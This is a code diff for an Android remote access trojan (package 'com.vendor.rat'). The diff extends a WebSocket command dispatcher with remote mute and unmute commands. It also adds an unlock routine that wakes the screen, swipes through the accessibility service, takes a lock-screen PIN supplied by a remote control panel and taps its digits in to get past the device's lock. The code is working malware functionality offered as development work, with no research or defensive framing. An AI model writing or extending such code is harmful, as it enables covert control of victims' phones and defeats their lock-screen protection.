@@ -2,6 +2,7 @@ package com.vendor.rat.control.handler;
 
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.GestureDescription;
+import android.app.KeyguardManager;
 import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.Context;
@@ -259,8 +260,8 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
     }
 
     /**
-     * 导航 / 点亮屏幕
-     * "ho" → 点亮屏幕 (WAKEUP), "bak" → 返回, "rec" → 多任务
+     * 导航: home / back / recent
+     * "ho" → HOME, "bak" → 返回, "rec" → 多任务
      */
     private void handleNav(JsonObject payload) {
         String nav = ScreenActionParser.getNav(payload);
@@ -503,6 +504,14 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
                 case DOWN:
                     am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI);
                     break;
+                case MUTE:
+                    am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_MUTE, 0);
+                    am.adjustStreamVolume(AudioManager.STREAM_RING, AudioManager.ADJUST_MUTE, 0);
+                    break;
+                case UNMUTE:
+                    am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_UNMUTE, 0);
+                    am.adjustStreamVolume(AudioManager.STREAM_RING, AudioManager.ADJUST_UNMUTE, 0);
+                    break;
                 default:
                     Log.w(TAG, "volume: unknown action");
             }
@@ -513,7 +522,11 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
 
     /**
      * 锁屏/解锁控制
-     * lock=1 → 锁屏, lock=0 → 解锁 (点亮屏幕 + 上滑)
+     * lock=1 → 锁屏
+     * lock=0 → 解锁: 判断屏幕状态和密码
+     *   - 无锁屏 → 不操作
+     *   - 有锁屏无密码 → 唤醒屏幕 + 上滑
+     *   - 有锁屏有密码 → 唤醒屏幕 + 上滑 + 模拟输入密码
      */
     private void handleLock(JsonObject payload) {
         String lock = ScreenActionParser.getLock(payload);
@@ -528,31 +541,120 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
                 }
                 break;
             case UNLOCK:
-                // 1. 先点亮屏幕
-                wakeScreen();
-                // 2. 延迟 500ms 后上滑解锁
-                new Thread(() -> {
-                    try {
-                        Thread.sleep(500);
-                        MyAccessibilityService service = MyAccessibilityService.P();
-                        if (service == null) return;
-                        int w = service.getResources().getDisplayMetrics().widthPixels;
-                        int h = service.getResources().getDisplayMetrics().heightPixels;
-                        Path path = new Path();
-                        path.moveTo(w / 2f, h * 0.8f);
-                        path.lineTo(w / 2f, h * 0.2f);
-                        GestureDescription gesture = new GestureDescription.Builder()
-                            .addStroke(new GestureDescription.StrokeDescription(path, 0, 300))
-                            .build();
-                        service.dispatchGesture(gesture, null, null);
-                        Log.d(TAG, "unlock: swipe up dispatched");
-                    } catch (Exception e) {
-                        Log.w(TAG, "unlock gesture failed", e);
-                    }
-                }).start();
+                handleUnlock();
                 break;
             default:
                 Log.w(TAG, "lock: unknown action");
+        }
+    }
+
+    private void handleUnlock() {
+        Context ctx = getAppContext();
+        if (ctx == null) return;
+
+        KeyguardManager km = (KeyguardManager) ctx.getSystemService(Context.KEYGUARD_SERVICE);
+        android.os.PowerManager pm = (android.os.PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
+
+        boolean screenOn = pm != null && pm.isInteractive();
+        boolean locked = km != null && km.isKeyguardLocked();
+        boolean hasPassword = km != null && km.isDeviceSecure();
+
+        Log.d(TAG, "unlock: screenOn=" + screenOn + ", locked=" + locked + ", hasPassword=" + hasPassword);
+
+        if (!locked && screenOn) {
+            Log.d(TAG, "unlock: screen already unlocked, no action");
+            return;
+        }
+
+        // 1. 唤醒屏幕
+        wakeScreen();
+
+        if (!locked) {
+            Log.d(TAG, "unlock: no lock screen, just woke up");
+            return;
+        }
+
+        // 2. 延迟后上滑解锁
+        new Thread(() -> {
+            try {
+                Thread.sleep(500);
+                MyAccessibilityService service = MyAccessibilityService.P();
+                if (service == null) return;
+
+                int w = service.getResources().getDisplayMetrics().widthPixels;
+                int h = service.getResources().getDisplayMetrics().heightPixels;
+                Path swipePath = new Path();
+                swipePath.moveTo(w / 2f, h * 0.8f);
+                swipePath.lineTo(w / 2f, h * 0.2f);
+                GestureDescription swipe = new GestureDescription.Builder()
+                    .addStroke(new GestureDescription.StrokeDescription(swipePath, 0, 300))
+                    .build();
+                service.dispatchGesture(swipe, null, null);
+                Log.d(TAG, "unlock: swipe up dispatched");
+
+                // 3. 如果有密码，等待密码输入界面出现后模拟输入
+                if (hasPassword) {
+                    Thread.sleep(800);
+                    // 从心跳缓存的 phoneInfo 获取密码 (Panel 通过 statusBatch 下发)
+                    // 或从 config 获取预设密码
+                    String password = getStoredPassword();
+                    if (password != null && !password.isEmpty()) {
+                        inputPassword(service, password);
+                    } else {
+                        Log.w(TAG, "unlock: device has password but no stored password available");
+                    }
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "unlock failed", e);
+            }
+        }).start();
+    }
+
+    /**
+     * 获取存储的锁屏密码
+     */
+    private String getStoredPassword() {
+        // 优先从 SharedPreferences 获取 (Panel 通过 phonepass 命令设置)
+        try {
+            Context ctx = getAppContext();
+            if (ctx != null) {
+                String pwd = ctx.getSharedPreferences("device_config", Context.MODE_PRIVATE)
+                    .getString("lock_password", "");
+                if (!pwd.isEmpty()) return pwd;
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "getStoredPassword failed", e);
+        }
+        return null;
+    }
+
+    /**
+     * 模拟输入密码 (数字密码)
+     */
+    private void inputPassword(AccessibilityService service, String password) {
+        try {
+            Log.d(TAG, "inputPassword: length=" + password.length());
+            for (int i = 0; i < password.length(); i++) {
+                char c = password.charAt(i);
+                // 通过无障碍服务查找数字按钮并点击
+                android.view.accessibility.AccessibilityNodeInfo root = service.getRootInActiveWindow();
+                if (root == null) continue;
+
+                // 查找包含该数字文本的按钮
+                java.util.List<android.view.accessibility.AccessibilityNodeInfo> nodes =
+                    root.findAccessibilityNodeInfosByText(String.valueOf(c));
+                for (android.view.accessibility.AccessibilityNodeInfo node : nodes) {
+                    if (node.isClickable()) {
+                        node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
+                        Log.d(TAG, "inputPassword: clicked digit " + c);
+                        break;
+                    }
+                }
+                root.recycle();
+                Thread.sleep(100);
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "inputPassword failed", e);
         }
     }
 
